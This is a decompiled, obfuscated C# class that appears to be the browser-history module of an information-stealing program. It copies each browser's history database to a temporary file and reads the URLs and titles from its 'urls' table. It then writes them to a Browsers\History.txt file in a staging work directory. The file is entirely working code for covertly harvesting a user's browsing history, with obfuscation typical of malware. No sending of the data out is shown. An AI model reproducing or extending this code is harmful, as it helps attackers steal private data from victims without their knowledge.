using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using who;

// Token: 0x0200003C RID: 60
internal class Class23
{
	// Token: 0x060001EB RID: 491 RVA: 0x0000FB9C File Offset: 0x0000DD9C
	public static void smethod_0()
	{
		string text = "";
		List<Class24> list = Class23.smethod_1();
		foreach (Class24 @class in list)
		{
			text += @class.ToString();
		}
		if (text != "")
		{
			if (!Directory.Exists(Dirs.WorkDir + "\\Browsers"))
			{
				Directory.CreateDirectory(Dirs.WorkDir + "\\Browsers");
			}
			File.WriteAllText(Dirs.WorkDir + "\\Browsers\\History.txt", text, Encoding.Default);
		}
	}

	// Token: 0x060001EC RID: 492 RVA: 0x0000FC54 File Offset: 0x0000DE54
	public static List<Class24> smethod_1()
	{
		List<Class24> list = new List<Class24>();
		foreach (string string_ in Dirs.BrowsHistory)
		{
			List<Class24> list2 = Class23.smethod_2(string_);
			if (list2 != null)
			{
				list.AddRange(list2);
			}
		}
		return list;
	}

	// Token: 0x060001ED RID: 493 RVA: 0x0000FC9C File Offset: 0x0000DE9C
	private static List<Class24> smethod_2(string string_0)
	{
		List<Class24> result;
		try
		{
			string text = Dirs.WorkDir + "test.fv";
			if (File.Exists(text))
			{
				File.Delete(text);
			}
			File.Copy(string_0, text, true);
			Class12 @class = new Class12(text);
			List<Class24> list = new List<Class24>();
			@class.method_4("urls");
			for (int i = 0; i < @class.method_1(); i++)
			{
				try
				{
					string a = string.Empty;
					try
					{
						a = @class.method_0(i, 5);
					}
					catch
					{
					}
					if (a != "")
					{
						List<Class24> list2 = list;
						Class24 class2 = new Class24();
						class2.method_1(@class.method_0(i, 1));
						class2.method_3(@class.method_0(i, 2));
						list2.Add(class2);
					}
				}
				catch
				{
				}
			}
			File.Delete(text);
			result = list;
		}
		catch
		{
			result = null;
		}
		return result;
	}

	// Token: 0x060001EE RID: 494 RVA: 0x0000276F File Offset: 0x0000096F
	public Class23()
	{
		Class34.A1SfXVPz7w9eh();
		base..ctor();
	}
}
